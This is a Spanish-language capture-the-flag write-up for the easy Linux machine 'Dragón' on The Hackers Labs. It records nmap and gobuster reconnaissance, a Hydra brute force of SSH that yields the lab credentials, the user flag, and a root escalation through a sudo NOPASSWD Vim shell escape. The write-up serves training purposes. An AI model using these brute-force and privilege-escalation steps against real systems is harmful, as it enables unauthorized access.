# 🐉 Dragón

```bash
┌──(Harou㉿kali)-[~/writeups/dragon]
└─$ cat info.txt

  Plataforma  : The Hackers Labs
  Dificultad  : 🟢 Fácil
  Sistema     : Linux (Ubuntu)
  Fecha       : 18/03/2026
  Estado      : ✅ Completada
```

---

## 🎯 `cat objetivo.txt`

> Máquina Linux con un servidor web Apache expuesto. El objetivo es encontrar credenciales
> ocultas en la web, acceder vía SSH y escalar privilegios hasta root aprovechando
> una mala configuración de sudoers con Vim.

---

## 🔍 `./reconnaissance.sh`

### Escaneo completo de puertos

```bash
nmap -p- -sS --open --min-rate 5000 -T4 -n -v -oN all_ports.nmap 192.168.0.22
```

**Puertos abiertos:**
| Puerto | Servicio | Versión |
|--------|----------|---------|
| 22/TCP | SSH | OpenSSH 9.6p1 (Ubuntu) |
| 80/TCP | HTTP | Apache 2.4.58 |

### Escaneo de versiones y scripts

```bash
nmap -p 22,80 -sV -sC -oN targeted_scan.nmap 192.168.0.22
```

**Análisis:** Las versiones son modernas — sin exploits directos conocidos.
El vector principal es el puerto 80. Se buscará fallos de configuración o archivos expuestos.

---

## 🕵️ `./enumeration.sh`

### Fuzzing de directorios web

```bash
gobuster dir -u http://192.168.0.22 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,bak
```

**Resultados:**

| Ruta | Código | Significado |
|------|--------|-------------|
| `/index.html` | 200 | Página principal accesible |
| `/server-status` | 403 | Prohibido — recurso interno de Apache |
| `/secret` | 301 | ⚠️ Redirección — carpeta con contenido oculto |

**Hallazgo clave:** El directorio `/secret/` contiene un acertijo con el nombre de usuario: **dragon**.

---

## ⚡ `./exploitation.sh`

### Ataque de fuerza bruta — SSH

Con el usuario `dragon` obtenido del directorio `/secret/`, se lanza un ataque de fuerza bruta contra el servicio SSH:

```bash
hydra -l dragon -P /usr/share/wordlists/rockyou.txt ssh://192.168.0.22 -t 4
```

**Credenciales obtenidas:**
```
Usuario   : dragon
Contraseña: shadow
Método    : Fuerza bruta con Hydra (wordlist rockyou.txt)
```

### Acceso inicial

```bash
ssh dragon@192.168.0.22
```

---

## 🏁 `cat flags.txt`

### User flag

```bash
cat /home/dragon/user.txt
```

```
e1f9c2e8a1d8477f9b3f6cd298f9f3bd
```

---

## 🚀 `./privesc.sh`

### Revisión de privilegios sudo

```bash
sudo -l
```

**Hallazgo:** El usuario `dragon` tiene permiso para ejecutar `/usr/bin/vim` como root sin contraseña (NOPASSWD).

### Escalada de privilegios — GTFOBins (Vim)

```bash
sudo /usr/bin/vim
```

Dentro de Vim, ejecutar:

```
:!/bin/bash
```

**Resultado:** Shell como root — `uid=0`.

### Root flag

```bash
cat /root/root.txt
```

---

## 🧠 `cat lecciones.txt`

- 💡 El fuzzing de directorios web puede revelar información crítica que no es visible a simple vista.
- 💡 Los nombres de usuario a veces se filtran en archivos o páginas web — siempre revisar el código fuente y directorios ocultos.
- 💡 La fuerza bruta con Hydra es efectiva cuando se tienen usuarios identificados y contraseñas débiles.
- 💡 Los permisos NOPASSWD en sudoers son una vulnerabilidad grave — binarios como Vim permiten escapar a una shell root (GTFOBins).
- 💡 Siempre comprobar `sudo -l` en la fase de post-explotación.

---

## 🛠️ `cat herramientas.txt`

```
nmap · gobuster · hydra · ssh · vim (GTFOBins)
```

---

## 🔗 `cat referencias.txt`

```
GTFOBins Vim  : https://gtfobins.github.io/gtfobins/vim/
Rockyou.txt   : wordlist incluida en Kali Linux
The Hackers Labs: https://thehackerslabs.com
```

---

<div align="center">

*`📚 Writeup educativo — The Hackers Labs | Dragón | Fácil`*

</div>
